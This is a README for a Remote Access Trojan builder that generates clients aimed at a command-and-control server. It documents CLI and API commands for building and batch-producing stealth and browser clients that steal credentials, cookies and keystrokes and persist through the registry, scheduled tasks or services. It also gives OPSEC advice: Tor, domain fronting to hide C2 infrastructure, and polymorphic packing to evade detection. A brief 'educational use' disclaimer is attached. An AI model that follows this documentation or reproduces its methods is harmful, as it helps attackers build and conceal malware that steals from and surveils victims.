# Rat Builder - Advanced Client Generation System

A comprehensive RAT (Remote Access Trojan) builder that generates customized clients with advanced obfuscation, persistence, and stealth capabilities.

## ⚠️ WARNING

This tool is designed for **educational purposes and authorized security testing only**. Using this tool on systems without explicit permission is illegal and unethical. Always obtain proper authorization before conducting any security testing.

## Features

### 🏗️ **Core Builder**
- **Multiple Templates**: Basic, Stealth, and Browser-based clients
- **Configuration Management**: Flexible configuration system with presets
- **Batch Generation**: Generate multiple clients simultaneously
- **Web Interface**: User-friendly GUI for client generation

### 🔐 **Obfuscation & Stealth**
- **Code Obfuscation**: Variable renaming, string encoding, control flow obfuscation
- **Anti-Analysis**: Debug detection, VM detection, sandbox evasion
- **Polymorphic Generation**: Generate unique variants of the same functionality
- **Self-Deobfuscating**: Clients that decode themselves at runtime

### 💾 **Persistence Mechanisms**
- **Windows Registry**: Persistent startup via registry keys
- **Startup Folder**: Copy to startup directories
- **Scheduled Tasks**: Create scheduled tasks for persistence
- **Service Installation**: Install as Windows service (advanced)

### 🌐 **Browser Capabilities**
- **DOM Manipulation**: Modify web pages in real-time
- **Form Grabbing**: Extract form data and credentials
- **Keylogging**: Capture keystrokes in web applications
- **Screenshot Capture**: Capture browser screenshots
- **Cookie/Storage Extraction**: Steal cookies and local storage

### 📦 **Distribution**
- **Executable Generation**: Create standalone executables
- **Code Packing**: Compress and encrypt generated code
- **Custom Injection**: Various injection methods and techniques

## Installation

```bash
# Clone the repository
git clone <repository-url>
cd rat-builder

# Install dependencies
npm install

# Install global dependencies
npm install -g pkg
```

## Usage

### Command Line Interface

#### Generate Single Client
```bash
node builder/index.js build https://your-c2-server.com your-auth-token basic --exe --persist
```

#### Generate Batch Clients
```bash
node builder/config-builder.js batch 50 --serverUrl=https://c2.example.com --template=stealth
```

#### Use Configuration Presets
```bash
node builder/config-builder.js preset stealth_production --serverUrl=https://c2.example.com --authToken=token123
```

### Web Interface

1. Start the web interface:
```bash
# Serve the web interface
python -m http.server 8080
# or use any static file server
```

2. Open `http://localhost:8080/builder/web-interface.html` in your browser

3. Configure your client using the intuitive web interface

### Configuration Options

#### Basic Configuration
- **serverUrl**: C2 server URL
- **authToken**: Authentication token
- **clientId**: Unique client identifier
- **template**: Client template (basic/stealth/browser)

#### Advanced Options
- **obfuscate**: Enable code obfuscation
- **persistence**: Add persistence mechanisms
- **executable**: Generate standalone executable
- **encrypted**: Enable encrypted communication
- **heartbeatInterval**: Heartbeat frequency in milliseconds

## Templates

### Basic Template
- Simple, lightweight client
- Essential C2 functionality
- Minimal resource usage
- Good for testing and demonstration

### Stealth Template
- Anti-analysis techniques
- VM and sandbox detection
- Debug detection
- Encrypted communication
- Randomized delays

### Browser Template
- Web-based client
- DOM manipulation capabilities
- Form and credential grabbing
- Keylogging functionality
- Screenshot capture

## Configuration Presets

### Basic Test
```json
{
  "template": "basic",
  "serverUrl": "http://localhost:8888",
  "authToken": "test-token-123",
  "obfuscate": false,
  "persistence": false
}
```

### Stealth Production
```json
{
  "template": "stealth",
  "obfuscate": true,
  "persistence": true,
  "encrypted": true,
  "antiDebug": true,
  "antiVM": true,
  "antiSandbox": true
}
```

### Browser Campaign
```json
{
  "template": "browser",
  "captureScreenshots": true,
  "keylogger": true,
  "formGrabber": true,
  "cookieExtractor": true,
  "phishing": true
}
```

## API Reference

### RatBuilder Class

#### Methods
- `buildClient(options)`: Generate a single client
- `batchBuild(configurations)`: Generate multiple clients
- `loadTemplate(templateName)`: Load client template
- `generateExecutable(jsPath, name, target)`: Create executable

#### Example
```javascript
const RatBuilder = require('./builder/index.js');
const builder = new RatBuilder();

const client = builder.buildClient({
  serverUrl: 'https://c2.example.com',
  authToken: 'secure-token-123',
  template: 'stealth',
  obfuscate: true,
  persistence: true,
  executable: true
});
```

### ConfigBuilder Class

#### Methods
- `createBasicConfig(options)`: Create basic configuration
- `createStealthConfig(options)`: Create stealth configuration
- `createBrowserConfig(options)`: Create browser configuration
- `generateBatchConfig(options)`: Generate batch configurations
- `createPreset(presetName, options)`: Load configuration preset

#### Example
```javascript
const ConfigBuilder = require('./builder/config-builder.js');
const configBuilder = new ConfigBuilder();

const config = configBuilder.createStealthConfig({
  serverUrl: 'https://c2.example.com',
  authToken: 'secure-token-123',
  antiDebug: true,
  persistence: true
});
```

### Obfuscator Class

#### Methods
- `obfuscateCode(code, options)`: Obfuscate JavaScript code
- `createSelfDeobfuscatingWrapper(code, method)`: Create self-deobfuscating code
- `generatePolymorphicCode(template, variations)`: Generate code variants
- `addAntiDebugging(code)`: Add anti-debugging measures

#### Example
```javascript
const Obfuscator = require('./builder/obfuscation.js');
const obfuscator = new Obfuscator();

const obfuscatedCode = obfuscator.obfuscateCode(originalCode, {
  method: 'custom',
  variables: true,
  strings: true,
  controlFlow: true,
  deadCode: true
});
```

## File Structure

```
builder/
├── index.js              # Main builder script
├── config-builder.js     # Configuration management
├── obfuscation.js        # Code obfuscation utilities
├── web-interface.html    # Web-based GUI
├── templates/            # Client templates
│   ├── basic.js         # Basic RAT template
│   ├── stealth.js       # Stealth RAT template
│   └── browser.js       # Browser RAT template
├── output/              # Generated clients
├── configs/             # Configuration files
└── README.md           # This file
```

## Security Considerations

### Operational Security (OPSEC)
1. **Use VPN/Tor**: Always route traffic through anonymizing networks
2. **Domain Fronting**: Use CDN services to hide C2 infrastructure
3. **Encryption**: Enable encrypted communication for all clients
4. **Token Security**: Use strong, unique authentication tokens
5. **Infrastructure**: Separate C2 infrastructure from testing environments

### Detection Avoidance
1. **Polymorphic Code**: Generate unique variants for each deployment
2. **Traffic Patterns**: Randomize heartbeat intervals and communication patterns
3. **File Signatures**: Use packing and encryption to avoid signature detection
4. **Behavior Analysis**: Implement anti-analysis techniques

### Legal Compliance
1. **Authorization**: Only use on systems you own or have explicit permission to test
2. **Documentation**: Maintain proper documentation of authorized testing activities
3. **Data Protection**: Handle captured data according to applicable laws and regulations
4. **Disclosure**: Follow responsible disclosure practices for discovered vulnerabilities

## Troubleshooting

### Common Issues

#### Client Generation Fails
- Check Node.js version (requires v14+)
- Verify all dependencies are installed
- Ensure sufficient disk space
- Check file permissions

#### Executable Creation Fails
- Install pkg globally: `npm install -g pkg`
- Check target platform compatibility
- Verify template syntax

#### Connection Issues
- Verify C2 server URL is accessible
- Check authentication token
- Ensure CORS is configured properly
- Verify firewall settings

### Debug Mode

Enable debug logging by setting environment variable:
```bash
export DEBUG=rat-builder
node builder/index.js build ...
```

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## Legal Disclaimer

This software is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse of this software. Users must comply with all applicable laws and regulations.

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review existing GitHub issues
3. Create a new issue with detailed information

---

**Remember**: With great power comes great responsibility. Use this tool ethically and responsibly.
